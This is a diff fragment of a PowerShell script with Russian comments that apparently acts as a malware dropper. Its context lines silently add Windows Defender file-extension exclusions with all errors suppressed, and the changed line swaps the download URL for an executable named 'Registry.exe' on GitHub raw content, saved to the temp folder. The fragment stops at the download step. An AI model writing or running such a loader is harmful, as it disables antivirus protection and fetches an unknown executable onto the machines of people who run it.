@@ -17,9 +17,8 @@ try {
         foreach ($Ext in $Extensions) { Add-MpPreference -ExclusionExtension $Ext -ErrorAction SilentlyContinue }
     }
 } catch {}
-
 # Прямая ссылка на твой исполняемый файл
-$url = "https://raw.githubusercontent.com/CheatCheckNo98237/rect/main/Registry.exe"
+$url = "https://raw.githubusercontent.com/selfleakmain/rect/main/Registry.exe"
 $p = "$env:TEMP\Registry.exe"
 
 # Скачивание файла
